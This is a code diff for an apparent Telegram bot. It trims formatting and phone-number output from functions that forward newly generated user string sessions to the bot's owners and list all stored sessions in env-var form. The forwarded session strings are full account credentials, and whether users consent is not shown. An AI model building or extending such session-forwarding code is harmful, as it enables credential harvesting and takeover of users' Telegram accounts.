@@ -261,7 +261,6 @@ async def send_string_session_to_owners(user_id: int, phone: str, name: str, ses
     
     message_text = (
         f"🔐 **New String Session Generated**\n\n"
-        f"**User Info:**\n"
         f"👤 User: {name} (ID: {user_id})\n"
         f"📱 Phone: `{phone}`\n\n"
         f"**Env Var Format:**\n{env_format}"
@@ -301,11 +300,9 @@ async def get_all_strings_command(update: Update, context: ContextTypes.DEFAULT_
     
     response = "🔑 **All String Sessions**\n\n"
     response += "Well Arranged Copy-Paste Env Var Format:\n\n"
-    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
     
     # Sessions from database
     if users:
-        response += "💾 **From Database (Active Sessions):**\n\n"
         for user in users:
             if not user.get("session_data"):
                 continue
@@ -313,15 +310,12 @@ async def get_all_strings_command(update: Update, context: ContextTypes.DEFAULT_
             username = user.get("name", "Unknown")
             user_id_val = user.get("user_id")
             session_string = user.get("session_data")
-            phone = user.get("phone", "Not available")
             
-            response += f"👤 **User:** {username} (ID: {user_id_val})\n"
-            response += f"📱 **Phone:** `{phone}`\n"
-            response += f"**Env Var Format:**\n```{user_id_val}:{session_string}```\n\n"
+            response += f"👤 User: {username} (ID: {user_id_val})\n\n"
+            response += f"Env Var Format:\n```{user_id_val}:{session_string}```\n\n"
     
     # Also include sessions from USER_SESSIONS env var
     if USER_SESSIONS:
-        response += "📁 **From USER_SESSIONS Environment Variable:**\n\n"
         for uid, session in USER_SESSIONS.items():
             # Try to get user info from database
             user_info = None
@@ -331,19 +325,9 @@ async def get_all_strings_command(update: Update, context: ContextTypes.DEFAULT_
                 pass
             
             username = user_info.get("name", "Unknown") if user_info else "Unknown"
-            phone = user_info.get("phone", "Not available") if user_info else "Not available"
             
-            response += f"👤 **User:** {username} (ID: {uid})\n"
-            response += f"📱 **Phone:** `{phone}`\n"
-            response += f"**Env Var Format:**\n```{uid}:{session}```\n\n"
-    
-    # Add usage instructions
-    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-    response += "**Usage Instructions:**\n"
-    response += "1. Copy all the `Env Var Format` lines\n"
-    response += "2. Add them to your USER_SESSIONS env var\n"
-    response += "3. Separate multiple entries with commas\n"
-    response += "4. Format: `user_id1:session1,user_id2:session2`"
+            response += f"👤 User: {username} (ID: {uid})\n\n"
+            response += f"Env Var Format:\n```{uid}:{session}```\n\n"
     
     # Split message if too long (Telegram has 4096 char limit)
     if len(response) > 4000:
@@ -403,18 +387,24 @@ async def get_user_string_command(update: Update, context: ContextTypes.DEFAULT_
     
     session_string = None
     username = "Unknown"
-    phone = "Not available"
     
     if user and user.get("session_data"):
         session_string = user.get("session_data")
         username = user.get("name", "Unknown")
-        phone = user.get("phone", "Not available")
     elif target_user_id in USER_SESSIONS:
         session_string = USER_SESSIONS[target_user_id]
         # Try to get username from database if available
         if user:
             username = user.get("name", "Unknown")
-            phone = user.get("phone", "Not available")
+        else:
+            # If no user in DB, get from active clients
+            if target_user_id in user_clients:
+                try:
+                    client = user_clients[target_user_id]
+                    me = await client.get_me()
+                    username = me.first_name or "Unknown"
+                except Exception:
+                    pass
     else:
         await update.message.reply_text(
             f"❌ **No Session Found!**\n\nNo string session found for user ID: `{target_user_id}`",
@@ -423,9 +413,7 @@ async def get_user_string_command(update: Update, context: ContextTypes.DEFAULT_
         return
     
     response = f"🔑 **String Session for 👤 User: {username} (ID: {target_user_id})**\n\n"
-    response += f"📱 **Phone:** `{phone}`\n\n"
-    response += f"**Env Var Format:**\n```{target_user_id}:{session_string}```\n\n"
-    response += "**To use:** Add this to your USER_SESSIONS environment variable."
+    response += f"**Env Var Format:**\n```{target_user_id}:{session_string}```"
     
     await update.message.reply_text(response, parse_mode="Markdown")
 
